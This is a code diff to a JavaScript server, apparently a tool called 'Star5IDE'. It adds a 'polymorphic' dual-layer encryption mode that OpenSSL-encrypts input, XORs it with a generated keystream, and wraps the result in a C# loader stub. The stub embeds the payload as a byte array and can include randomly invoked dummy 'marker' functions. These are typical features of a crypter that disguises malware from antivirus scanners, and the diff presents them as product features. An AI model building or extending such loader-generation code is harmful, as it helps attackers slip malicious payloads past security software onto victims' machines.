@@ -59,14 +59,22 @@ function runCli(args, inputBuffer) {
 /* ───────────── hot-patch targets ───────────── */
 const HP = createHotPatcher();
 
-/* encrypt */
+/* encrypt - enhanced with polymorphic support */
 HP.registerTarget("encrypt", async (body, query) => {
   const mode   = (query.mode || "password").toString();
   const cipher = query.cipher || "camellia-256-cbc";
+  const poly   = query.poly || "xor";
+  const genmode = query.genmode || "binary";
+  const hotpatch = query.hotpatch === "true";
   let   pass   = query.pass;
 
   if (mode === "password" && !pass)
     throw new Error("pass required as ?pass=");
+
+  /* polymorphic mode - new Star5IDE feature */
+  if (mode === "polymorphic") {
+    return await applyDualLayerEncryption(body, pass, cipher, poly, genmode, hotpatch);
+  }
 
   /* autokey path */
   if (mode === "autokey") {
@@ -296,7 +304,7 @@ function getDynamicCapabilitiesSafe() {
 }
 
 /* ───────────── polymorphic generation helpers ───────────── */
-async function applyDualLayerEncryption(inputBuffer, pass, cipher, poly) {
+async function applyDualLayerEncryption(inputBuffer, pass, cipher, poly, genmode = "binary", hotpatch = false) {
   // Layer 1: OpenSSL encryption
   const layer1 = await runCli(["encrypt", "--pass", pass, "--cipher", cipher], inputBuffer);
   
@@ -308,7 +316,17 @@ async function applyDualLayerEncryption(inputBuffer, pass, cipher, poly) {
     layer2[i] = layer1[i] ^ keystream[i % keystream.length];
   }
   
-  return layer2;
+  // Generate output based on mode
+  switch (genmode) {
+    case "loader":
+      return generatePolymorphicStub(layer2, cipher, poly, hotpatch);
+    case "dual":
+      // Return both as ZIP or combined format
+      const stub = generatePolymorphicStub(layer2, cipher, poly, hotpatch);
+      return Buffer.concat([Buffer.from("DUAL:"), stub, Buffer.from(":BINARY:"), layer2]);
+    default:
+      return layer2; // Just the encrypted binary
+  }
 }
 
 function generateKeystream(length, polyType, seed) {
@@ -335,8 +353,28 @@ function generateKeystream(length, polyType, seed) {
   return keystream;
 }
 
-function generatePolymorphicStub(encryptedData, cipher, poly) {
+function generatePolymorphicStub(encryptedData, cipher, poly, hotpatch = false) {
   const dataArray = Array.from(encryptedData).map(b => `0x${b.toString(16).padStart(2, '0')}`).join(', ');
+  
+  const hotPatchMarkers = hotpatch ? `
+        // Hot patch markers - car() functions for runtime modification
+        static void Car1() { /* Polymorphic marker 1 */ }
+        static void Car2() { /* Polymorphic marker 2 */ }
+        static void Car3() { /* Polymorphic marker 3 */ }
+        static void Car4() { /* Polymorphic marker 4 */ }
+        static void Car5() { /* Polymorphic marker 5 */ }
+        
+        static void ExecuteCarMarkers()
+        {
+            var markers = new Action[] { Car1, Car2, Car3, Car4, Car5 };
+            var rng = new Random();
+            for (int i = 0; i < 3; i++)
+            {
+                markers[rng.Next(markers.Length)]();
+            }
+        }` : '';
+
+  const hotPatchCall = hotpatch ? '            ExecuteCarMarkers();' : '';
   
   return `using System;
 using System.Runtime.InteropServices;
